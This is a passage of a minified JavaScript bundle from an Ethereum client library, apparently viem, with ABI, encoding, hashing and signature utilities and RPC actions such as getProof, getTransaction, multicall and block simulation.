0,t.ripemd160=t.keccak256=t.isHash=t.getAction=t.formatTransactionRequest=t.defineTransactionRequest=t.defineTransactionReceipt=t.transactionType=t.formatTransaction=t.defineTransaction=t.formatLog=t.defineFormatter=t.extract=t.formatBlock=t.defineBlock=t.getTransactionError=t.getNodeError=t.containsNodeError=t.getEstimateGasError=t.getContractError=t.getCallError=t.toRlp=t.toHex=t.stringToHex=t.numberToHex=t.bytesToHex=t.boolToHex=t.toBytes=t.stringToBytes=t.numberToBytes=t.hexToBytes=t.boolToBytes=t.fromRlp=t.hexToString=t.hexToNumber=t.hexToBool=t.hexToBigInt=t.fromHex=t.fromBytes=t.bytesToString=t.bytesToNumber=t.bytesToBool=t.bytesToBigint=t.bytesToBigInt=t.trim=t.sliceHex=t.sliceBytes=t.slice=t.size=t.padHex=void 0,t.validateTypedData=t.serializeTypedData=t.serializeTransaction=t.serializeAccessList=t.parseTransaction=t.getTransactionType=t.getSerializedTransactionType=t.assertTransactionLegacy=t.assertTransactionEIP2930=t.assertTransactionEIP1559=t.assertRequest=t.stringify=t.verifyTypedData=t.verifyMessage=t.verifyHash=t.serializeErc8010Signature=t.serializeErc6492Signature=t.recoverTypedDataAddress=t.recoverPublicKey=t.recoverMessageAddress=t.recoverAddress=t.parseErc8010Signature=t.parseErc6492Signature=t.isErc8010Signature=t.isErc6492Signature=t.hashTypedData=t.hashStruct=t.hashMessage=t.getWebSocketRpcClient=t.socketClientCache=t.getSocketRpcClient=t.getHttpRpcClient=t.rpc=t.getSocket=t.integerRegex=t.bytesRegex=t.arrayRegex=t.nonceManager=t.createNonceManager=t.getFunctionSignature=t.toFunctionSignature=t.getFunctionSelector=t.toFunctionSelector=t.toFunctionHash=t.getEventSignature=t.toEventSignature=t.getEventSelector=t.toEventSelector=t.toEventHash=t.sha256=void 0,t.parseUnits=t.parseGwei=t.parseEther=t.formatUnits=t.formatGwei=t.formatEther=void 0;var e=n0();Object.defineProperty(t,"parseAbi",{enumerable:!0,get:function(){return e.parseAbi}}),Object.defineProperty(t,"parseAbiItem",{enumerable:!0,get:function(){return e.parseAbiItem}}),Object.defineProperty(t,"parseAbiParameter",{enumerable:!0,get:function(){return e.parseAbiParameter}}),Object.defineProperty(t,"parseAbiParameters",{enumerable:!0,get:function(){return e.parseAbiParameters}});var n=Qr();Object.defineProperty(t,"parseAccount",{enumerable:!0,get:function(){return n.parseAccount}});var r=fle();Object.defineProperty(t,"publicKeyToAddress",{enumerable:!0,get:function(){return r.publicKeyToAddress}});var i=s0();Object.defineProperty(t,"decodeAbiParameters",{enumerable:!0,get:function(){return i.decodeAbiParameters}});var s=$8();Object.defineProperty(t,"decodeErrorResult",{enumerable:!0,get:function(){return s.decodeErrorResult}});var o=qA();Object.defineProperty(t,"decodeEventLog",{enumerable:!0,get:function(){return o.decodeEventLog}});var a=iM();Object.defineProperty(t,"decodeFunctionData",{enumerable:!0,get:function(){return a.decodeFunctionData}});var c=eh();Object.defineProperty(t,"decodeFunctionResult",{enumerable:!0,get:function(){return c.decodeFunctionResult}});var l=Ku();Object.defineProperty(t,"encodeAbiParameters",{enumerable:!0,get:function(){return l.encodeAbiParameters}});var f=KA();Object.defineProperty(t,"encodeDeployData",{enumerable:!0,get:function(){return f.encodeDeployData}});var h=sM();Object.defineProperty(t,"encodeErrorResult",{enumerable:!0,get:function(){return h.encodeErrorResult}});var m=oy();Object.defineProperty(t,"encodeEventTopics",{enumerable:!0,get:function(){return m.encodeEventTopics}});var b=ma();Object.defineProperty(t,"encodeFunctionData",{enumerable:!0,get:function(){return b.encodeFunctionData}});var w=oM();Object.defineProperty(t,"encodeFunctionResult",{enumerable:!0,get:function(){return w.encodeFunctionResult}});var y=Hle();Object.defineProperty(t,"encodePacked",{enumerable:!0,get:function(){return y.encodePacked}});var E=Zf();Object.defineProperty(t,"formatAbiItem",{enumerable:!0,get:function(){return E.formatAbiItem}}),Object.defineProperty(t,"formatAbiParams",{enumerable:!0,get:function(){return E.formatAbiParams}});var A=dle();Object.defineProperty(t,"formatAbiItemWithArgs",{enumerable:!0,get:function(){return A.formatAbiItemWithArgs}});var R=Qf();Object.defineProperty(t,"getAbiItem",{enumerable:!0,get:function(){return R.getAbiItem}});var S=VA();Object.defineProperty(t,"parseEventLogs",{enumerable:!0,get:function(){return S.parseEventLogs}});var v=nc();Object.defineProperty(t,"getAddress",{enumerable:!0,get:function(){return v.getAddress}});var k=zle();Object.defineProperty(t,"getContractAddress",{enumerable:!0,get:function(){return k.getContractAddress}}),Object.defineProperty(t,"getCreate2Address",{enumerable:!0,get:function(){return k.getCreate2Address}}),Object.defineProperty(t,"getCreateAddress",{enumerable:!0,get:function(){return k.getCreateAddress}});var O=pa();Object.defineProperty(t,"isAddress",{enumerable:!0,get:function(){return O.isAddress}});var _=Ju();Object.defineProperty(t,"isAddressEqual",{enumerable:!0,get:function(){return _.isAddressEqual}});var I=gle();Object.defineProperty(t,"hashAuthorization",{enumerable:!0,get:function(){return I.hashAuthorization}});var T=UA();Object.defineProperty(t,"recoverAuthorizationAddress",{enumerable:!0,get:function(){return T.recoverAuthorizationAddress}});var B=qle();Object.defineProperty(t,"serializeAuthorizationList",{enumerable:!0,get:function(){return B.serializeAuthorizationList}});var U=Vle();Object.defineProperty(t,"verifyAuthorization",{enumerable:!0,get:function(){return U.verifyAuthorization}});var M=Wle();Object.defineProperty(t,"buildRequest",{enumerable:!0,get:function(){return M.buildRequest}});var N=aM();Object.defineProperty(t,"ccipRequest",{enumerable:!0,get:function(){return N.ccipRequest}}),Object.defineProperty(t,"ccipFetch",{enumerable:!0,get:function(){return N.ccipRequest}}),Object.defineProperty(t,"offchainLookup",{enumerable:!0,get:function(){return N.offchainLookup}}),Object.defineProperty(t,"offchainLookupAbiItem",{enumerable:!0,get:function(){return N.offchainLookupAbiItem}}),Object.defineProperty(t,"offchainLookupSignature",{enumerable:!0,get:function(){return N.offchainLookupSignature}});var q=QA();Object.defineProperty(t,"assertCurrentChain",{enumerable:!0,get:function(){return q.assertCurrentChain}});var P=Gle();Object.defineProperty(t,"defineChain",{enumerable:!0,get:function(){return P.defineChain}});var C=Kle();Object.defineProperty(t,"extractChain",{enumerable:!0,get:function(){return C.extractChain}});var j=h0();Object.defineProperty(t,"getChainContractAddress",{enumerable:!0,get:function(){return j.getChainContractAddress}});var z=os();Object.defineProperty(t,"concat",{enumerable:!0,get:function(){return z.concat}}),Object.defineProperty(t,"concatBytes",{enumerable:!0,get:function(){return z.concatBytes}}),Object.defineProperty(t,"concatHex",{enumerable:!0,get:function(){return z.concatHex}});var $=yM();Object.defineProperty(t,"isBytes",{enumerable:!0,get:function(){return $.isBytes}});var H=So();Object.defineProperty(t,"isHex",{enumerable:!0,get:function(){return H.isHex}});var L=r0();Object.defineProperty(t,"pad",{enumerable:!0,get:function(){return L.pad}}),Object.defineProperty(t,"padBytes",{enumerable:!0,get:function(){return L.padBytes}}),Object.defineProperty(t,"padHex",{enumerable:!0,get:function(){return L.padHex}});var V=fa();Object.defineProperty(t,"size",{enumerable:!0,get:function(){return V.size}});var G=Jc();Object.defineProperty(t,"slice",{enumerable:!0,get:function(){return G.slice}}),Object.defineProperty(t,"sliceBytes",{enumerable:!0,get:function(){return G.sliceBytes}}),Object.defineProperty(t,"sliceHex",{enumerable:!0,get:function(){return G.sliceHex}});var Z=Yf();Object.defineProperty(t,"trim",{enumerable:!0,get:function(){return Z.trim}});var J=Fj();Object.defineProperty(t,"bytesToBigInt",{enumerable:!0,get:function(){return J.bytesToBigInt}}),Object.defineProperty(t,"bytesToBigint",{enumerable:!0,get:function(){return J.bytesToBigInt}}),Object.defineProperty(t,"bytesToBool",{enumerable:!0,get:function(){return J.bytesToBool}}),Object.defineProperty(t,"bytesToNumber",{enumerable:!0,get:function(){return J.bytesToNumber}}),Object.defineProperty(t,"bytesToString",{enumerable:!0,get:function(){return J.bytesToString}}),Object.defineProperty(t,"fromBytes",{enumerable:!0,get:function(){return J.fromBytes}});var ne=ci();Object.defineProperty(t,"fromHex",{enumerable:!0,get:function(){return ne.fromHex}}),Object.defineProperty(t,"hexToBigInt",{enumerable:!0,get:function(){return ne.hexToBigInt}}),Object.defineProperty(t,"hexToBool",{enumerable:!0,get:function(){return ne.hexToBool}}),Object.defineProperty(t,"hexToNumber",{enumerable:!0,get:function(){return ne.hexToNumber}}),Object.defineProperty(t,"hexToString",{enumerable:!0,get:function(){return ne.hexToString}});var re=wM();Object.defineProperty(t,"fromRlp",{enumerable:!0,get:function(){return re.fromRlp}});var le=yr();Object.defineProperty(t,"boolToBytes",{enumerable:!0,get:function(){return le.boolToBytes}}),Object.defineProperty(t,"hexToBytes",{enumerable:!0,get:function(){return le.hexToBytes}}),Object.defineProperty(t,"numberToBytes",{enumerable:!0,get:function(){return le.numberToBytes}}),Object.defineProperty(t,"stringToBytes",{enumerable:!0,get:function(){return le.stringToBytes}}),Object.defineProperty(t,"toBytes",{enumerable:!0,get:function(){return le.toBytes}});var oe=lt();Object.defineProperty(t,"boolToHex",{enumerable:!0,get:function(){return oe.boolToHex}}),Object.defineProperty(t,"bytesToHex",{enumerable:!0,get:function(){return oe.bytesToHex}}),Object.defineProperty(t,"numberToHex",{enumerable:!0,get:function(){return oe.numberToHex}}),Object.defineProperty(t,"stringToHex",{enumerable:!0,get:function(){return oe.stringToHex}}),Object.defineProperty(t,"toHex",{enumerable:!0,get:function(){return oe.toHex}});var ue=MA();Object.defineProperty(t,"toRlp",{enumerable:!0,get:function(){return ue.toRlp}});var be=tM();Object.defineProperty(t,"getCallError",{enumerable:!0,get:function(){return be.getCallError}});var Me=c0();Object.defineProperty(t,"getContractError",{enumerable:!0,get:function(){return Me.getContractError}});var Te=ble();Object.defineProperty(t,"getEstimateGasError",{enumerable:!0,get:function(){return Te.getEstimateGasError}});var Oe=LA();Object.defineProperty(t,"containsNodeError",{enumerable:!0,get:function(){return Oe.containsNodeError}}),Object.defineProperty(t,"getNodeError",{enumerable:!0,get:function(){return Oe.getNodeError}});var Ke=HA();Object.defineProperty(t,"getTransactionError",{enumerable:!0,get:function(){return Ke.getTransactionError}});var it=q8();Object.defineProperty(t,"defineBlock",{enumerable:!0,get:function(){return it.defineBlock}}),Object.defineProperty(t,"formatBlock",{enumerable:!0,get:function(){return it.formatBlock}});var at=l0();Object.defineProperty(t,"extract",{enumerable:!0,get:function(){return at.extract}});var At=FA();Object.defineProperty(t,"defineFormatter",{enumerable:!0,get:function(){return At.defineFormatter}});var Et=Xf();Object.defineProperty(t,"formatLog",{enumerable:!0,get:function(){return Et.formatLog}});var ze=ww();Object.defineProperty(t,"defineTransaction",{enumerable:!0,get:function(){return ze.defineTransaction}}),Object.defineProperty(t,"formatTransaction",{enumerable:!0,get:function(){return ze.formatTransaction}}),Object.defineProperty(t,"transactionType",{enumerable:!0,get:function(){return ze.transactionType}});var Re=JA();Object.defineProperty(t,"defineTransactionReceipt",{enumerable:!0,get:function(){return Re.defineTransactionReceipt}});var xn=Yu();Object.defineProperty(t,"defineTransactionRequest",{enumerable:!0,get:function(){return xn.defineTransactionRequest}}),Object.defineProperty(t,"formatTransactionRequest",{enumerable:!0,get:function(){return xn.formatTransactionRequest}});var Ln=Pn();Object.defineProperty(t,"getAction",{enumerable:!0,get:function(){return Ln.getAction}});var Nn=vM();Object.defineProperty(t,"isHash",{enumerable:!0,get:function(){return Nn.isHash}});var Ne=ha();Object.defineProperty(t,"keccak256",{enumerable:!0,get:function(){return Ne.keccak256}});var Ve=Yle();Object.defineProperty(t,"ripemd160",{enumerable:!0,get:function(){return Ve.ripemd160}});var Qe=Kj();Object.defineProperty(t,"sha256",{enumerable:!0,get:function(){return Qe.sha256}});var dt=Qle();Object.defineProperty(t,"toEventHash",{enumerable:!0,get:function(){return dt.toEventHash}});var cr=bw();Object.defineProperty(t,"toEventSelector",{enumerable:!0,get:function(){return cr.toEventSelector}}),Object.defineProperty(t,"getEventSelector",{enumerable:!0,get:function(){return cr.toEventSelector}});var ui=Jle();Object.defineProperty(t,"toEventSignature",{enumerable:!0,get:function(){return ui.toEventSignature}}),Object.defineProperty(t,"getEventSignature",{enumerable:!0,get:function(){return ui.toEventSignature}});var ks=Xle();Object.defineProperty(t,"toFunctionHash",{enumerable:!0,get:function(){return ks.toFunctionHash}});var eo=sy();Object.defineProperty(t,"toFunctionSelector",{enumerable:!0,get:function(){return eo.toFunctionSelector}}),Object.defineProperty(t,"getFunctionSelector",{enumerable:!0,get:function(){return eo.toFunctionSelector}});var Hr=ede();Object.defineProperty(t,"toFunctionSignature",{enumerable:!0,get:function(){return Hr.toFunctionSignature}}),Object.defineProperty(t,"getFunctionSignature",{enumerable:!0,get:function(){return Hr.toFunctionSignature}});var xr=tde();Object.defineProperty(t,"createNonceManager",{enumerable:!0,get:function(){return xr.createNonceManager}}),Object.defineProperty(t,"nonceManager",{enumerable:!0,get:function(){return xr.nonceManager}});var Vi=L8();Object.defineProperty(t,"arrayRegex",{enumerable:!0,get:function(){return Vi.arrayRegex}}),Object.defineProperty(t,"bytesRegex",{enumerable:!0,get:function(){return Vi.bytesRegex}}),Object.defineProperty(t,"integerRegex",{enumerable:!0,get:function(){return Vi.integerRegex}});var br=ide();Object.defineProperty(t,"getSocket",{enumerable:!0,get:function(){return br.getSocket}}),Object.defineProperty(t,"rpc",{enumerable:!0,get:function(){return br.rpc}});var ic=_M();Object.defineProperty(t,"getHttpRpcClient",{enumerable:!0,get:function(){return ic.getHttpRpcClient}});var Xc=rde();Object.defineProperty(t,"getSocketRpcClient",{enumerable:!0,get:function(){return Xc.getSocketRpcClient}}),Object.defineProperty(t,"socketClientCache",{enumerable:!0,get:function(){return Xc.socketClientCache}});var th=AM();Object.defineProperty(t,"getWebSocketRpcClient",{enumerable:!0,get:function(){return th.getWebSocketRpcClient}});var To=XA();Object.defineProperty(t,"hashMessage",{enumerable:!0,get:function(){return To.hashMessage}});var sc=e5();Object.defineProperty(t,"hashStruct",{enumerable:!0,get:function(){return sc.hashStruct}}),Object.defineProperty(t,"hashTypedData",{enumerable:!0,get:function(){return sc.hashTypedData}});var wr=SM();Object.defineProperty(t,"isErc6492Signature",{enumerable:!0,get:function(){return wr.isErc6492Signature}});var xo=IM();Object.defineProperty(t,"isErc8010Signature",{enumerable:!0,get:function(){return xo.isErc8010Signature}});var Io=dde();Object.defineProperty(t,"parseErc6492Signature",{enumerable:!0,get:function(){return Io.parseErc6492Signature}});var as=fde();Object.defineProperty(t,"parseErc8010Signature",{enumerable:!0,get:function(){return as.parseErc8010Signature}});var g0=u0();Object.defineProperty(t,"recoverAddress",{enumerable:!0,get:function(){return g0.recoverAddress}});var el=RM();Object.defineProperty(t,"recoverMessageAddress",{enumerable:!0,get:function(){return el.recoverMessageAddress}});var Ro=zj();Object.defineProperty(t,"recoverPublicKey",{enumerable:!0,get:function(){return Ro.recoverPublicKey}});var to=PM();Object.defineProperty(t,"recoverTypedDataAddress",{enumerable:!0,get:function(){return to.recoverTypedDataAddress}});var eu=hde();Object.defineProperty(t,"serializeErc6492Signature",{enumerable:!0,get:function(){return eu.serializeErc6492Signature}});var tu=pde();Object.defineProperty(t,"serializeErc8010Signature",{enumerable:!0,get:function(){return tu.serializeErc8010Signature}});var ya=mde();Object.defineProperty(t,"verifyHash",{enumerable:!0,get:function(){return ya.verifyHash}});var ba=gde();Object.defineProperty(t,"verifyMessage",{enumerable:!0,get:function(){return ba.verifyMessage}});var wa=yde();Object.defineProperty(t,"verifyTypedData",{enumerable:!0,get:function(){return wa.verifyTypedData}});var va=Ns();Object.defineProperty(t,"stringify",{enumerable:!0,get:function(){return va.stringify}});var nh=Qu();Object.defineProperty(t,"assertRequest",{enumerable:!0,get:function(){return nh.assertRequest}});var cs=rR();Object.defineProperty(t,"assertTransactionEIP1559",{enumerable:!0,get:function(){return cs.assertTransactionEIP1559}}),Object.defineProperty(t,"assertTransactionEIP2930",{enumerable:!0,get:function(){return cs.assertTransactionEIP2930}}),Object.defineProperty(t,"assertTransactionLegacy",{enumerable:!0,get:function(){return cs.assertTransactionLegacy}});var no=NM();Object.defineProperty(t,"getSerializedTransactionType",{enumerable:!0,get:function(){return no.getSerializedTransactionType}});var Ir=Z8();Object.defineProperty(t,"getTransactionType",{enumerable:!0,get:function(){return Ir.getTransactionType}});var Jr=OM();Object.defineProperty(t,"parseTransaction",{enumerable:!0,get:function(){return Jr.parseTransaction}});var Ds=bM();Object.defineProperty(t,"serializeAccessList",{enumerable:!0,get:function(){return Ds.serializeAccessList}});var nu=iR();Object.defineProperty(t,"serializeTransaction",{enumerable:!0,get:function(){return nu.serializeTransaction}});var tl=sR();Object.defineProperty(t,"serializeTypedData",{enumerable:!0,get:function(){return tl.serializeTypedData}}),Object.defineProperty(t,"validateTypedData",{enumerable:!0,get:function(){return tl.validateTypedData}});var rh=jA();Object.defineProperty(t,"formatEther",{enumerable:!0,get:function(){return rh.formatEther}});var ih=ay();Object.defineProperty(t,"formatGwei",{enumerable:!0,get:function(){return ih.formatGwei}});var Po=H8();Object.defineProperty(t,"formatUnits",{enumerable:!0,get:function(){return Po.formatUnits}});var nl=wde();Object.defineProperty(t,"parseEther",{enumerable:!0,get:function(){return nl.parseEther}});var No=vde();Object.defineProperty(t,"parseGwei",{enumerable:!0,get:function(){return No.parseGwei}});var us=cR();Object.defineProperty(t,"parseUnits",{enumerable:!0,get:function(){return us.parseUnits}})})(ak)),ak}var ZX;function A$e(){if(ZX)return bS;ZX=1,Object.defineProperty(bS,"__esModule",{value:!0}),bS.formatProof=n;const t=kM();function e(r){return r.map(i=>({...i,value:BigInt(i.value)}))}function n(r){return{...r,balance:r.balance?BigInt(r.balance):void 0,nonce:r.nonce?(0,t.hexToNumber)(r.nonce):void 0,storageProof:r.storageProof?e(r.storageProof):void 0}}return bS}var YX;function C$e(){if(YX)return yS;YX=1,Object.defineProperty(yS,"__esModule",{value:!0}),yS.getProof=n;const t=lt(),e=A$e();async function n(r,{address:i,blockNumber:s,blockTag:o,storageKeys:a}){const c=o??"latest",l=s!==void 0?(0,t.numberToHex)(s):void 0,f=await r.request({method:"eth_getProof",params:[i,a,l||c]});return(0,e.formatProof)(f)}return yS}var ZS={},QX;function S$e(){if(QX)return ZS;QX=1,Object.defineProperty(ZS,"__esModule",{value:!0}),ZS.getStorageAt=e;const t=lt();async function e(n,{address:r,blockNumber:i,blockTag:s="latest",slot:o}){const a=i!==void 0?(0,t.numberToHex)(i):void 0;return await n.request({method:"eth_getStorageAt",params:[r,o,a||s]})}return ZS}var YS={},JX;function DM(){if(JX)return YS;JX=1,Object.defineProperty(YS,"__esModule",{value:!0}),YS.getTransaction=r;const t=ga(),e=lt(),n=ww();async function r(i,{blockHash:s,blockNumber:o,blockTag:a,hash:c,index:l,sender:f,nonce:h}){const m=a||"latest",b=o!==void 0?(0,e.numberToHex)(o):void 0;let w=null;if(c?w=await i.request({method:"eth_getTransactionByHash",params:[c]},{dedupe:!0}):s?w=await i.request({method:"eth_getTransactionByBlockHashAndIndex",params:[s,(0,e.numberToHex)(l)]},{dedupe:!0}):typeof l=="number"?w=await i.request({method:"eth_getTransactionByBlockNumberAndIndex",params:[b||m,(0,e.numberToHex)(l)]},{dedupe:!!b}):f&&typeof h=="number"&&(w=await i.request({method:"eth_getTransactionBySenderAndNonce",params:[f,(0,e.numberToHex)(h)]},{dedupe:!0})),!w)throw new t.TransactionNotFoundError({blockHash:s,blockNumber:o,blockTag:m,hash:c,index:l});return(i.chain?.formatters?.transaction?.format||n.formatTransaction)(w,"getTransaction")}return YS}var QS={},XX;function T$e(){if(XX)return QS;XX=1,Object.defineProperty(QS,"__esModule",{value:!0}),QS.getTransactionConfirmations=r;const t=Pn(),e=YA(),n=DM();async function r(i,{hash:s,transactionReceipt:o}){const[a,c]=await Promise.all([(0,t.getAction)(i,e.getBlockNumber,"getBlockNumber")({}),s?(0,t.getAction)(i,n.getTransaction,"getTransaction")({hash:s}):void 0]),l=o?.blockNumber||c?.blockNumber;return l?a-l+1n:0n}return QS}var JS={},eee;function Ede(){if(eee)return JS;eee=1,Object.defineProperty(JS,"__esModule",{value:!0}),JS.getTransactionReceipt=n;const t=ga(),e=JA();async function n(r,{hash:i}){const s=await r.request({method:"eth_getTransactionReceipt",params:[i]},{dedupe:!0});if(!s)throw new t.TransactionReceiptNotFoundError({hash:i});return(r.chain?.formatters?.transactionReceipt?.format||e.formatTransactionReceipt)(s,"getTransactionReceipt")}return JS}var XS={},tee;function x$e(){if(tee)return XS;tee=1,Object.defineProperty(XS,"__esModule",{value:!0}),XS.multicall=h;const t=f0(),e=WA(),n=$r(),r=Kt(),i=o0(),s=eh(),o=ma(),a=h0(),c=c0(),l=Pn(),f=ld();async function h(m,b){const{account:w,authorizationList:y,allowFailure:E=!0,blockNumber:A,blockOverrides:R,blockTag:S,stateOverride:v}=b,k=b.contracts,{batchSize:O=b.batchSize??1024,deployless:_=b.deployless??!1}=typeof m.batch?.multicall=="object"?m.batch.multicall:{},I=(()=>{if(b.multicallAddress)return b.multicallAddress;if(_)return null;if(m.chain)return(0,a.getChainContractAddress)({blockNumber:A,chain:m.chain,contract:"multicall3"});throw new Error("client chain not configured. multicallAddress is required.")})(),T=[[]];let B=0,U=0;for(let q=0;q<k.length;q++){const{abi:P,address:C,args:j,functionName:z}=k[q];try{const $=(0,o.encodeFunctionData)({abi:P,args:j,functionName:z});U+=($.length-2)/2,O>0&&U>O&&T[B].length>0&&(B++,U=($.length-2)/2,T[B]=[]),T[B]=[...T[B],{allowFailure:!0,callData:$,target:C}]}catch($){const H=(0,c.getContractError)($,{abi:P,address:C,args:j,docsPath:"/docs/contract/multicall",functionName:z,sender:w});if(!E)throw H;T[B]=[...T[B],{allowFailure:!0,callData:"0x",target:C}]}}const M=await Promise.allSettled(T.map(q=>(0,l.getAction)(m,f.readContract,"readContract")({...I===null?{code:e.multicall3Bytecode}:{address:I},abi:t.multicall3Abi,account:w,args:[q],authorizationList:y,blockNumber:A,blockOverrides:R,blockTag:S,functionName:"aggregate3",stateOverride:v}))),N=[];for(let q=0;q<M.length;q++){const P=M[q];if(P.status==="rejected"){if(!E)throw P.reason;for(let j=0;j<T[q].length;j++)N.push({status:"failure",error:P.reason,result:void 0});continue}const C=P.value;for(let j=0;j<C.length;j++){const{returnData:z,success:$}=C[j],{callData:H}=T[q][j],{abi:L,address:V,functionName:G,args:Z}=k[N.length];try{if(H==="0x")throw new n.AbiDecodingZeroDataError;if(!$)throw new i.RawContractError({data:z});const J=(0,s.decodeFunctionResult)({abi:L,args:Z,data:z,functionName:G});N.push(E?{result:J,status:"success"}:J)}catch(J){const ne=(0,c.getContractError)(J,{abi:L,address:V,args:Z,docsPath:"/docs/contract/multicall",functionName:G});if(!E)throw ne;N.push({error:ne,result:void 0,status:"failure"})}}}if(N.length!==k.length)throw new r.BaseError("multicall results mismatch");return N}return XS}var e4={},nee;function _de(){if(nee)return e4;nee=1,Object.defineProperty(e4,"__esModule",{value:!0}),e4.simulateBlocks=E;const t=Ile(),e=Qr(),n=$r(),r=o0(),i=Jf(),s=eh(),o=ma(),a=os(),c=lt(),l=c0(),f=LA(),h=q8(),m=Xf(),b=Yu(),w=qj(),y=Qu();async function E(A,R){const{blockNumber:S,blockTag:v=A.experimental_blockTag??"latest",blocks:k,returnFullTransactions:O,traceTransfers:_,validation:I}=R;try{const T=[];for(const N of k){const q=N.blockOverrides?t.toRpc(N.blockOverrides):void 0,P=N.calls.map(j=>{const z=j,$=z.account?(0,e.parseAccount)(z.account):void 0,H=z.abi?(0,o.encodeFunctionData)(z):z.data,L={...z,account:$,data:z.dataSuffix?(0,a.concat)([H||"0x",z.dataSuffix]):H,from:z.from??$?.address};return(0,y.assertRequest)(L),(0,b.formatTransactionRequest)(L)}),C=N.stateOverrides?(0,w.serializeStateOverride)(N.stateOverrides):void 0;T.push({blockOverrides:q,calls:P,stateOverrides:C})}const U=(typeof S=="bigint"?(0,c.numberToHex)(S):void 0)||v;return(await A.request({method:"eth_simulateV1",params:[{blockStateCalls:T,returnFullTransactions:O,traceTransfers:_,validation:I},U]})).map((N,q)=>({...(0,h.formatBlock)(N),calls:N.calls.map((P,C)=>{const{abi:j,args:z,functionName:$,to:H}=k[q].calls[C],L=P.error?.data??P.returnData,V=BigInt(P.gasUsed),G=P.logs?.map(re=>(0,m.formatLog)(re)),Z=P.status==="0x1"?"success":"failure",J=j&&Z==="success"&&L!=="0x"?(0,s.decodeFunctionResult)({abi:j,data:L,functionName:$}):null,ne=(()=>{if(Z==="success")return;let re;if(P.error?.data==="0x"?re=new n.AbiDecodingZeroDataError:P.error&&(re=new r.RawContractError(P.error)),!!re)return(0,l.getContractError)(re,{abi:j??[],address:H??"0x",args:z,functionName:$??"<unknown>"})})();return{data:L,gasUsed:V,logs:G,status:Z,...Z==="success"?{result:J}:{error:ne}}})}))}catch(T){const B=T,U=(0,f.getNodeError)(B,{});throw U instanceof i.UnknownNodeError?B:U}}return e4}var t4={},sp={},lo={},Pb={},ree;function I$e(){if(ree)return Pb;ree=1,Object.defineProperty(Pb,"__esModule",{value:!0}),Pb.normalizeSignature=n,Pb.isArgOfType=r,Pb.getAmbiguousTypes=i;const t=oR(),e=rc();function n(s){let o=!0,a="",c=0,l="",f=!1;for(let h=0;h<s.length;h++){const m=s[h];if(["(",")",","].includes(m)&&(o=!0),m==="("&&c++,m===")"&&c--,!!o){if(c===0){if(m===" "&&["event","function","error",""].includes(l))l="";else if(l+=m,m===")"){f=!0;break}continue}if(m===" "){s[h-1]!==","&&a!==","&&a!==",("&&(a="",o=!1);continue}l+=m,a+=m}}if(!f)throw new e.BaseError("Unable to normalize signature.");return l}function r(s,o){const a=typeof s,c=o.type;switch(c){case"address":return t.validate(s,{strict:!1});case"bool":return a==="boolean";case"function":return a==="string";case"string":return a==="string";default:return c==="tuple"&&"components"in o?Object.values(o.components).every((l,f)=>r(Object.values(s)[f],l)):/^u?int(8|16|24|32|40|48|56|64|72|80|88|96|104|112|120|128|136|144|152|160|168|176|184|192|200|208|216|224|232|240|248|256)?$/.test(c)?a==="number"||a==="bigint":/^bytes([1-9]|1[0-9]|2[0-9]|3[0-2])?$/.test(c)?a==="string"||s instanceof Uint8Array:/[a-z]+[1-9]{0,3}(\[[0-9]{0,}\])+$/.test(c)?Array.isArray(s)&&s.every(l=>r(l,{...o,type:c.replace(/(\[[0-9]{0,}\])$/,"")})):!1}}function i(s,o,a){for(const c in s){const l=s[c],f=o[c];if(l.type==="tuple"&&f.type==="tuple"&&"components"in l&&"components"in f)return i(l.components,f.components,a[c]);const h=[l.type,f.type];if(h.includes("address")&&h.includes("bytes20")?!0:h.includes("address")&&h.includes("string")?t.validate(a[c],{strict:!1}):h.includes("address")&&h.includes("bytes")?t.validate(a[c],{strict:!1}):!1)return h}}return Pb}var iee;function Ade(){if(iee)return lo;iee=1,Object.defineProperty(lo,"__esModule",{value:!0}),lo.InvalidSelectorSizeError=lo.NotFoundError=lo.AmbiguityError=void 0,lo.format=s,lo.from=o,lo.fromAbi=a,lo.getSelector=c,lo.getSignature=l,lo.getSignatureHash=f;const t=n0(),e=rc(),n=TM(),r=Os(),i=I$e();function s(w){return t.formatAbiItem(w)}function o(w,y={}){const{prepare:E=!0}=y,A=Array.isArray(w)||typeof w=="string"?t.parseAbiItem(w):w;return{...A,...E?{hash:f(A)}:{}}}function a(w,y,E){const{args:A=[],prepare:R=!0}=E??{},S=r.validate(y,{strict:!1}),v=w.filter(_=>S?_.type==="function"||_.type==="error"?c(_)===r.slice(y,0,4):_.type==="event"?f(_)===y:!1:"name"in _&&_.name===y);if(v.length===0)throw new m({name:y});if(v.length===1)return{...v[0],...R?{hash:f(v[0])}:{}};let k;for(const _ of v){if(!("inputs"in _))continue;if(!A||A.length===0){if(!_.inputs||_.inputs.length===0)return{..._,...R?{hash:f(_)}:{}};continue}if(!_.inputs||_.inputs.length===0||_.inputs.length!==A.length)continue;if(A.every((T,B)=>{const U="inputs"in _&&_.inputs[B];return U?i.isArgOfType(T,U):!1})){if(k&&"inputs"in k&&k.inputs){const T=i.getAmbiguousTypes(_.inputs,k.inputs,A);if(T)throw new h({abiItem:_,type:T[0]},{abiItem:k,type:T[1]})}k=_}}const O=(()=>{if(k)return k;const[_,...I]=v;return{..._,overloads:I}})();if(!O)throw new m({name:y});return{...O,...R?{hash:f(O)}:{}}}function c(...w){const y=(()=>{if(Array.isArray(w[0])){const[E,A]=w;return a(E,A)}return w[0]})();return r.slice(f(y),0,4)}function l(...w){const y=(()=>{if(Array.isArray(w[0])){const[A,R]=w;return a(A,R)}return w[0]})(),E=typeof y=="string"?y:t.formatAbiItem(y);return i.normalizeSignature(E)}function f(...w){const y=(()=>{if(Array.isArray(w[0])){const[E,A]=w;return a(E,A)}return w[0]})();return typeof y!="string"&&"hash"in y&&y.hash?y.hash:n.keccak256(r.fromString(l(y)))}class h extends e.BaseError{constructor(y,E){super("Found ambiguous types in overloaded ABI Items.",{metaMessages:[`\`${y.type}\` in \`${i.normalizeSignature(t.formatAbiItem(y.abiItem))}\`, and`,`\`${E.type}\` in \`${i.normalizeSignature(t.formatAbiItem(E.abiItem))}\``,"","These types encode differently and cannot be distinguished at runtime.","Remove one of the ambiguous items in the ABI."]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiItem.AmbiguityError"})}}lo.AmbiguityError=h;class m extends e.BaseError{constructor({name:y,data:E,type:A="item"}){const R=y?` with name "${y}"`:E?` with data "${E}"`:"";super(`ABI ${A}${R} not found.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiItem.NotFoundError"})}}lo.NotFoundError=m;class b extends e.BaseError{constructor({data:y}){super(`Selector size is 